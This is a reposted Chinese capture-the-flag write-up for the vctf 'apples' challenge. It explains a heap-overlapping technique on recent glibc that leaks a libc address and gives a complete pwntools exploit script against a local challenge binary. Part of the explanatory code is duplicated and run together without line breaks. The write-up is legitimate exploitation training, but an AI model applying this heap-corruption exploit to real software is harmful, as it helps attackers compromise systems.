# vctf apples leak libc操作复现(高版本libc overlapping)

> 原文: https://www.ctfiot.com/174987.html
> ID: 174987

一

安全检查机制

二

利用原理

三

利用

add(0x410, "a" * 8) # 0 290add(0x100, "a" * 8) # 1 6b0add(0x430, "a" * 8) # 2 7c0add(0x430, "a" * 8) # 3 c00add(0x100, "a" * 8) # 4 1040add(0x480, "a" * 8) # 5 1150add(0x420, "a" * 8) # 6 15e0add(0x10, "a" * 8) # 7 1a10 free(0)free(3)free(6)
# 触发合并 然后合成一个0x860的大chunk 让我们可以分割
# 并且我们的fd和bk在0x430+16字节的位置 也就是0x440位置存在fd和bkfree(2)
# add一个比chunk 0 chunk6都大的chunk这样就会去分割0x860chunk 然后我们控制我们的payload 设置一个size到原本size的地方
# 这样fd和bk分别指向chunk 0 和chunk 6 这样我们可以构造一个 合法的chunk head头add(0x450, b"a" * 0x438 + p16(0x551)) # 0
# 将 chunk3 变为alloctedadd(0x410, "a" * 8) # 2add(0x420, "a" * 8) # 3add(0x410, "a" * 8) # 6

这里需要特殊说明 这里的chunk3的地址要特殊一些 也就是最低的地址为00 这样方便我们后面使用off_by_one漏洞来实现修改fd/bk的低地址为0来让FD->bk BK->fd 指向我们伪造的chunk (后面会详细说明)

# 覆写chunk0的fdfree(6) #free的chunk 3free(2) #free的chunk 0add(0x410, "a" * 8) # 2add(0x410, "a" * 8) # 6

free(6)free(3)free(5) add(0x4f0, b"b" * 0x488 + p64(0x431)) # 3add(0x3b0, "a" * 8) # 5

free(4) add(0x108, b"c" * 0x100 + p64(0x550)) # 4add(0x400, "a" * 8) # 6free(3)add(0x10, "a" * 8) # 3show(6)

四

脚本

from pwn import *
# from pwncli import *

# context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux', 'sp', '-h']
context(os='linux', arch='amd64')
local = 1
elf = ELF('./vuln')
if local:
 p = gdb.debug('./vuln',"b *main+57")
 libc = ELF('./libc.so')
else:
 p = remote('', 0)
 libc = ELF('./libc.so')

sd = lambda s: p.send(s)
sl = lambda s: p.sendline(s)
sa = lambda n, s: p.sendafter(n, s)
sla = lambda n, s: p.sendlineafter(n, s)
rc = lambda n: p.recv(n)
rl = lambda: p.recvline()
ru = lambda s: p.recvuntil(s)
ra = lambda: p.recvall()
ia = lambda: p.interactive()
uu32 = lambda data: u32(data.ljust(4, b"x00"))
uu64 = lambda data: u64(data.ljust(8, b"x00"))

def cmd(op):
 sla(">> ", str(op))

def add(size, content):
 cmd(1)
 sla("How many students do you want to add: ", str(1))
 sla("Gender (m/f): ", "m")
 sla("Size: ", str(size))
 sa("Content:", content)
 print("--------------nadd一个n--------------")

def show(index): # gender,content,size
 cmd(2)
 sla("Enter the index of the student: ", str(index))
 cmd(2)
 print("--------------nshow一个n--------------")

def free(index): # gender,content,size
 cmd(3)
 sla("Enter the index of the student: ", str(index))
 cmd(2)
 print("--------------n删除一个n--------------")

add(0x410, "a" * 8) # 0 290
add(0x100, "a" * 8) # 1 6b0
add(0x430, "a" * 8) # 2 7c0
add(0x430, "a" * 8) # 3 c00
add(0x100, "a" * 8) # 4 1040
add(0x480, "a" * 8) # 5 1150
add(0x420, "a" * 8) # 6 15e0
add(0x10, "a" * 8) # 7 1a10

free(0)
free(3)
free(6)
# 触发合并 然后合成一个0x860的大chunk 让我们可以分割
# 并且我们的fd和bk在0x430+16字节的位置 也就是0x440位置存在fd和bk
free(2)
# add一个比chunk 0 chunk6都大的chunk这样就会去分割0x860chunk 然后我们控制我们的payload 设置一个size到原本size的地方
# 这样fd和bk分别指向chunk 0 和chunk 6 这样我们可以构造一个 合法的chunk head头
add(0x450, b"a" * 0x438 + p16(0x551)) # 0
# 将 chunk3 变为allocted
add(0x410, "a" * 8) # 2
add(0x420, "a" * 8) # 3
add(0x410, "a" * 8) # 6
print("构造fake chunk成功")
free(6)
free(2)
add(0x410, "a" * 8) # 2
add(0x410, "a" * 8) # 6
print("构造FD->bk成功")
free(6)
free(3)
free(5)

add(0x4f0, b"b" * 0x488 + p64(0x431)) # 3
add(0x3b0, "a" * 8) # 5
print("构造BK->fd成功")
free(4)

add(0x108, b"c" * 0x100 + p64(0x550)) # 4
add(0x400, "a" * 8) # 6
free(3)
add(0x10, "a" * 8) # 3
show(6)

看雪ID：ElegyYuan0x1

https://bbs.kanxue.com/user-home-994584.htm

*本文为看雪论坛优秀文章，由 ElegyYuan0x1 原创，转载请注明来自看雪社区

# 往期推荐

1、自定义Linker实现分析之路

2、逆向分析VT加持的无畏契约纯内核挂

3、阿里云CTF2024-暴力ENOTYOURWORLD题解

4、Hypervisor From Scratch – 基本概念和配置测试环境、进入 VMX 操作

5、V8漏洞利用之对象伪造漏洞利用模板

球分享

球点赞

球在看

点击阅读原文查看更多


```
一
安全检查机制
二
利用原理
三
利用
add(0x410, "a" * 8) # 0 290add(0x100, "a" * 8) # 1 6b0add(0x430, "a" * 8) # 2 7c0add(0x430, "a" * 8) # 3 c00add(0x100, "a" * 8) # 4 1040add(0x480, "a" * 8) # 5 1150add(0x420, "a" * 8) # 6 15e0add(0x10, "a" * 8) # 7 1a10 free(0)free(3)free(6)
# 触发合并 然后合成一个0x860的大chunk 让我们可以分割
# 并且我们的fd和bk在0x430+16字节的位置 也就是0x440位置存在fd和bkfree(2)
# add一个比chunk 0 chunk6都大的chunk这样就会去分割0x860chunk 然后我们控制我们的payload 设置一个size到原本size的地方
# 这样fd和bk分别指向chunk 0 和chunk 6 这样我们可以构造一个 合法的chunk head头add(0x450, b"a" * 0x438 + p16(0x551)) # 0
# 将 chunk3 变为alloctedadd(0x410, "a" * 8) # 2add(0x420, "a" * 8) # 3add(0x410, "a" * 8) # 6
# 覆写chunk0的fdfree(6) #free的chunk 3free(2) #free的chunk 0add(0x410, "a" * 8) # 2add(0x410, "a" * 8) # 6
free(6)free(3)free(5) add(0x4f0, b"b" * 0x488 + p64(0x431)) # 3add(0x3b0, "a" * 8) # 5
free(4) add(0x108, b"c" * 0x100 + p64(0x550)) # 4add(0x400, "a" * 8) # 6free(3)add(0x10, "a" * 8) # 3show(6)
四
脚本
from pwn import *
# from pwncli import *

# context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux', 'sp', '-h']
context(os='linux', arch='amd64')
local = 1
elf = ELF('./vuln')
if local:
 p = gdb.debug('./vuln',"b *main+57")
 libc = ELF('./libc.so')
else:
 p = remote('', 0)
 libc = ELF('./libc.so')

sd = lambda s: p.send(s)
sl = lambda s: p.sendline(s)
sa = lambda n, s: p.sendafter(n, s)
sla = lambda n, s: p.sendlineafter(n, s)
rc = lambda n: p.recv(n)
rl = lambda: p.recvline()
ru = lambda s: p.recvuntil(s)
ra = lambda: p.recvall()
ia = lambda: p.interactive()
uu32 = lambda data: u32(data.ljust(4, b"x00"))
uu64 = lambda data: u64(data.ljust(8, b"x00"))

def cmd(op):
 sla(">> ", str(op))

def add(size, content):
 cmd(1)
 sla("How many students do you want to add: ", str(1))
 sla("Gender (m/f): ", "m")
 sla("Size: ", str(size))
 sa("Content:", content)
 print("--------------nadd一个n--------------")

def show(index): # gender,content,size
 cmd(2)
 sla("Enter the index of the student: ", str(index))
 cmd(2)
 print("--------------nshow一个n--------------")

def free(index): # gender,content,size
 cmd(3)
 sla("Enter the index of the student: ", str(index))
 cmd(2)
 print("--------------n删除一个n--------------")

add(0x410, "a" * 8) # 0 290
add(0x100, "a" * 8) # 1 6b0
add(0x430, "a" * 8) # 2 7c0
add(0x430, "a" * 8) # 3 c00
add(0x100, "a" * 8) # 4 1040
add(0x480, "a" * 8) # 5 1150
add(0x420, "a" * 8) # 6 15e0
add(0x10, "a" * 8) # 7 1a10

free(0)
free(3)
free(6)
# 触发合并 然后合成一个0x860的大chunk 让我们可以分割
# 并且我们的fd和bk在0x430+16字节的位置 也就是0x440位置存在fd和bk
free(2)
# add一个比chunk 0 chunk6都大的chunk这样就会去分割0x860chunk 然后我们控制我们的payload 设置一个size到原本size的地方
# 这样fd和bk分别指向chunk 0 和chunk 6 这样我们可以构造一个 合法的chunk head头
add(0x450, b"a" * 0x438 + p16(0x551)) # 0
# 将 chunk3 变为allocted
add(0x410, "a" * 8) # 2
add(0x420, "a" * 8) # 3
add(0x410, "a" * 8) # 6
print("构造fake chunk成功")
free(6)
free(2)
add(0x410, "a" * 8) # 2
add(0x410, "a" * 8) # 6
print("构造FD->bk成功")
free(6)
free(3)
free(5)

add(0x4f0, b"b" * 0x488 + p64(0x431)) # 3
add(0x3b0, "a" * 8) # 5
print("构造BK->fd成功")
free(4)

add(0x108, b"c" * 0x100 + p64(0x550)) # 4
add(0x400, "a" * 8) # 6
free(3)
add(0x10, "a" * 8) # 3
show(6)
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/3-1713607478.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/7-1713607479.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/1-1713607479.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/0-1713607480.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/9-1713607480.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/8-1713607481.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/6-1713607481.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/8-1713607482.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/9-1713607482.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/3-1713607483.jpeg)